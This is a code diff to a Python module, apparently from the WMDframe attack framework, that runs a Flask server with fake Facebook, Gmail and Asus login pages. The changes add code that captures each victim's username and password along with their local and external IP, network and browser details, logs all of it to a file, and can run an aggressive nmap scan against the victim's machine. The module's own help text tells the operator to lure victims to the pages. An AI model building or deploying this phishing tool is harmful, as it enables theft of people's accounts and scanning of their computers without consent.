@@ -3,12 +3,13 @@
 # MIT - (c) 2016 ThomasTJ (TTJ)
 #
 # Module for WMDframe
-# This modules is used for creating a local server with phishing pages
+# This modules is used for creating a local flask server with phishing pages
 #
 
 
 import argparse
 import os
+from datetime import datetime
 from flask import Flask, render_template, request, redirect
 try:
     import core.core as core
@@ -28,8 +29,8 @@ except:
 # Parser START
 # ==========================
 parser = argparse.ArgumentParser()
-# parser.add_argument('-ip', '--lanip', help='IP to monitor', metavar='IP') # Example. Use with "args.lanip"
 parser.add_argument('-r', '--run', action='store_true', help='Start monitoring')
+parser.add_argument('-p', '--page', action='store_true', help='f = facebook, g = gmail, a = asus')
 args, unknown = parser.parse_known_args()
 # ==========================
 # Parser END
@@ -40,9 +41,9 @@ args, unknown = parser.parse_known_args()
 # Core START
 # ==========================
 config = core.config()
-# INTERFACE_NET = (config['NETWORK']['INTERFACE_NET'])
+NMAP_SYM = (config['TOOLS']['NMAP_SYM'])
 
-logger = core.log()
+# logger = core.log()
 # logger.debug('Starting module')
 # ==========================
 # Core END
@@ -74,23 +75,39 @@ class Options():
     Datecreation = '2017/02/01'
     Lastmodified = '2017/02/01'
 
-    def __init__(self):
+    def __init__(self, fakepage, scan, log):
         """Define variables and show options on run."""
+        self.page = fakepage
+        self.scan = scan
+        self.log = log
         self.show_all()
 
     def poss_opt(self):
         """Possible options. These variables are checked when the user tries to 'set' an option."""
-        return ('NA')
+        return ('page', 'scan', 'log')
 
     def show_opt(self):
         """Show the possible options."""
         print(
+            ''
+            '\n\t' + bc.OKBLUE + ('%-*s %-*s %-*s %s' % (15, 'OPTION', 8, 'RQ', 18, 'VALUE', 'DESCRIPTION')) + bc.ENDC +
+            '\n\t' + ('%-*s %-*s %-*s %s' % (15, '------', 8, '--', 18, '-----', '-----------')) +
+            '\n\t' + ('%-*s %-*s %-*s %s' % (15, 'page:', 8, 'n', 18, self.page, 'This will set the landingpage (/), otherwise you\'ll need to append like "/facebook"')) +
+            '\n\t' + ('%-*s %-*s %-*s %s' % (15, 'scan:', 8, 'n', 18, self.scan, 'Scan the victims local ip (y/n)')) +
+            '\n\t' + ('%-*s %-*s %-*s %s' % (15, 'log:', 8, 'n', 18, self.log, 'Name of logfile. Empty = no logging, only printing to screen.')) +
+            '\n'
+        )
+        print(
             '' +
+            '\n\t' + bc.OKBLUE + 'AVAILABLE OPTIONS FOR PAGE setting:' + bc.ENDC +
+            '\n\t' + 'a  -->  asus' +
+            '\n\t' + 'f  -->  facebook' +
+            '\n\t' + 'g  -->  gmail' +
+            '\n'
             '\n\t' + bc.OKBLUE + 'AVAILABLE PHISING SITES:' + bc.ENDC +
             '\n\t' + '/asus' +
             '\n\t' + '/facebook' +
             '\n\t' + '/gmail' +
-            '\n\t' + '/index' + '  <--  Extract all client data with JS' +
             '\n'
         )
 
@@ -132,6 +149,32 @@ class Options():
 # END OPTIONS
 
 
+def get_html_page(short):
+    """Looping through available pages and returning the choosen one."""
+    if short == 'a':
+        fakepage = 'asus.html'
+    elif short == 'f':
+        fakepage = 'facebook.html'
+    elif short == 'g':
+        fakepage = 'gmail.com'
+    else:
+        fakepage = 'https://www.youtube.com/watch?v=oHg5SJYRHA0'
+    return fakepage
+
+
+def save_log_file(results):
+    """Save results to logfile."""
+    logfile = 'logs/' + sop.log
+    if not os.path.isfile(logfile):
+        os.mknod(logfile)
+    with open(logfile, 'a') as file:
+        file.write(results)
+    print(bc.OKGREEN + '\t[+]  Logfile save at: ' + logfile + bc.ENDC)
+
+
+# ==================== #
+# Defining FLASK
+# ==================== #
 app = Flask(__name__)
 
 
@@ -141,24 +184,33 @@ app = Flask(__name__)
 @app.route('/')
 def index():
     """Main index"""
-    return render_template('index.html')
+    if sop.page:
+        fakepage = get_html_page(sop.page)
+        print('\tSomeone is going to visit ' + fakepage + '...')
+        return render_template(fakepage)
+    else:
+        print('\tNothing specified for landing page.. going RickRoll...')
+        return redirect("https://www.youtube.com/watch?v=oHg5SJYRHA0")
 
 
 @app.route('/asus')
 def asus():
     """Phishing page"""
+    print("\tSomeone is visiting /asus...")
     return render_template('asus.html')
 
 
 @app.route('/gmail')
 def gmail():
     """Phishing page"""
+    print("\tSomeone is visiting /gmail...")
     return render_template('gmail.html')
 
 
 @app.route('/facebook')
 def facebook():
     """Phishing page"""
+    print("\tSomeone is visiting /facebook...")
     return render_template('facebook.html')
 
 
@@ -168,13 +220,40 @@ def redirectUser():
     Username = request.form['Username']
     Passwd = request.form['Passwd']
     redirectUser = request.form['redirect']
+    iplocal = request.form['iplocal']
+    ipexternal = request.form['ipexternal']
+    network = request.form['network']
+    browser = request.form['browser']
     print(
         '\n\t' + '[+]  Found something for you!' +
         '\n\t' + bc.OKGREEN + '[+]  Username: ' + Username +
         '\n\t' + bc.OKGREEN + '[+]  Password: ' + Passwd +
-        '\n\t' + bc.WARN + '[+]  Redirect: ' + redirectUser +
+        '\n\t' + bc.WARN + '[+]  Redirect: ' + bc.ENDC + redirectUser +
+        '\n\t' + bc.WARN + '[+]  Local ip: ' + bc.ENDC + iplocal +
+        '\n\t' + bc.WARN + '[+]  Exter. ip: ' + bc.ENDC + ipexternal +
+        '\n\t' + bc.WARN + '[+]  Network: ' + bc.ENDC + network +
+        '\n\t' + bc.WARN + '[+]  Browser: ' + bc.ENDC + browser +
         '\n' + bc.ENDC
     )
+
+    if sop.log:
+        results = (
+            '\n' + datetime.now().strftime('%Y-%m-%d %H:%M:%S') +
+            '\nUsername: ' + Username +
+            '\nPassword: ' + Passwd +
+            '\nRedirect: ' + redirectUser +
+            '\nIp local: ' + iplocal +
+            '\nIp external: ' + ipexternal +
+            '\nNetwork info: ' + network +
+            '\nBrowser info: ' + browser +
+            '\n'
+        )
+        save_log_file(results)
+
+    if sop.scan.lower() == 'y':
+        print('\t[*]  Initiating nmap scan. Results will NOT be saved.')
+        comm.runCommand(NMAP_SYM + ' -A -sV -sC -T4 -v ' + iplocal, 'EwilTwinScan-' + iplocal)
+
     return redirect(redirectUser)
 # ==================== #
 # FLASK ROUTES - END
@@ -196,6 +275,12 @@ def info():
     """Show the modules info - optional."""
     print("""
         Module for use in WMDframe.
+
+        This module will setup a flask server serving fake pages.
+        Redirect your victim to the page. The landingpages will
+        show a loginpage. When the victim clicks the loginbutton
+        the username, password and various client information is
+        printed in the console.
         """)
 
     if parser.format_help():
@@ -252,9 +337,16 @@ def main():
     print('\t|__/|__/\___/_.___/ .___/\__,_/\__, /\___/  /_/   /_/ /_/_/____/_/ /_/_/_/ /_/\__, /    ')
     print('\t                 /_/          /____/                                         /____/     ')
     print('\n')
-    global sop
+    print('\t' + bc.OKBLUE + 'CHECKING REQUIREMENTS' + bc.ENDC)
+    comm.checkInstalledOpt(NMAP_SYM)
+    print('')
+    if args.page:
+        fakepage = get_html_page(args.page)
+    else:
+        fakepage = ''
     # The parameters to be passed to the module on init
-    sop = Options()
+    global sop
+    sop = Options(fakepage, 'n', 'EwilTwin.log')
     if args.run:
         run()
     else:
